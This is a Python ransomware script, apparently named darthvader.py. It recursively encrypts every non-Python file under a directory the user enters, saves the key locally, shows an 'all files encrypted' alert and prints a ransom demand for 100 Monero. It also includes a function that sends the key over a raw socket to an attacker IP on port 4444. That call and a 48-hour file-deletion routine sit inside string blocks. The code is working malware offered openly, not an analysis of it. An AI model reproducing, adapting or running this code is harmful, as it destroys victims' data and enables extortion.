# Author: SergioZ3R0
import subprocess # Import the subprocess module
import sys # Import the sys module
import os # Import the os module
import logging
import ctypes
# Configuración del logging
logging.basicConfig(filename='log.txt', level=logging.ERROR,
                    format='%(asctime)s - %(levelname)s - %(message)s')
#Install cryptography module
def install(package): # Install the required package
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

install('cryptography') # Install the cryptography package
from cryptography.fernet import Fernet  # Import the Fernet class from the cryptography module
import socket # Import the socket module
from datetime import datetime, timedelta # Import the datetime and timedelta

files = [] # List to store the files in the current directory
def recorrer_arbol_directorios(directory):
    global files
    try:
        for file in os.listdir(directory):
            rute_element = os.path.join(directory, file)
            if not os.path.islink(rute_element):
                if os.path.isdir(rute_element):
                    # Ignora los directorios relacionados con Python
                    if "python" in rute_element.lower():
                        continue
                    print("Directory:", rute_element)
                    recorrer_arbol_directorios(rute_element)
                else:
                    # Ignora los archivos relacionados con Python
                    if file.endswith('.py') or file == "darthvader.py" or file == "key.key" or file == "decrypt.py" or file == "encryption_time.txt":
                        continue
                    print("File:", rute_element)
                    files.append(rute_element)
    except PermissionError:
        error_message = f"No tienes permisos para acceder a la carpeta: {directory}"
        print(error_message)
        logging.error(error_message)
    except OSError as e:
        error_message = f"Error de E/S: {e}"
        print(error_message)
        logging.error(error_message)
    except RecursionError:
        error_message = f"Error: Recursión infinita detectada en la carpeta: {directory}"
        print(error_message)
        logging.error(error_message)
    except Exception as e:
        error_message = f"Error inesperado: {e}"
        print(error_message)
        logging.error(error_message)
    print(files)

recorrer_arbol_directorios(input("Introduce la ruta del directorio inicial: "))

key = Fernet.generate_key() # Generate a key

with open("key.key", "wb") as key_file: # Open the key file in write binary mode
    key_file.write(key) # Write the key to the file

for file in files:
    try:
        with open(file, "rb") as f: # Open the file in read binary mode
            data = f.read()
        data_encrypted = Fernet(key).encrypt(data) # Encrypt the file
        with open(file, "wb") as f:
            f.write(data_encrypted) # Write the encrypted data to the file
    except Exception as e:
        print(f"Error encrypting file {file}: {e}")

if sys.platform == "linux":
    subprocess.Popen(['zenity', '--info', '--text=' + "All files have been encrypted!"])
else:
    ctypes.windll.user32.MessageBoxW(0, "All file have been encrypted", "Notification", 1)
print("All files encrypted! Send me 100 Monero(XMR) to my wallet(WALLET)")

def send_file_to_host(file_path, host, port): # Send the key file to the attacker
    with open(file_path, 'rb') as file:
        data = file.read()

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: # Create a socket object
        s.connect((host, port)) # Connect to the attacker's server
        s.sendall(data) # Send the file
"""
# Usage: send_file
try:    # Send the key file to the attacker
    send_file_to_host('key.key', '172.22.9.204', 4444)
except:
    print("Error sending key file Unreachable host")
# Store the encryption time
with open("encryption_time.txt", "w") as f:
    f.write(str(datetime.now()))
# Read the encryption time from the file
"""
with open("encryption_time.txt", "r") as f:
    encryption_time = datetime.fromisoformat(f.read().strip())
"""
# Check if 48 hours have passed
if datetime.now() - encryption_time > timedelta(hours=48): # 48 hours have passed
    # Check if the transfer has been made
    # This depends on your implementation
    # If the transfer has not been made, delete all files
    print("48 hours have passed")
#    for file in os.listdir():
#        os.remove(file)
#Delete the randsomware
#os.remove("darthvader.py")
"""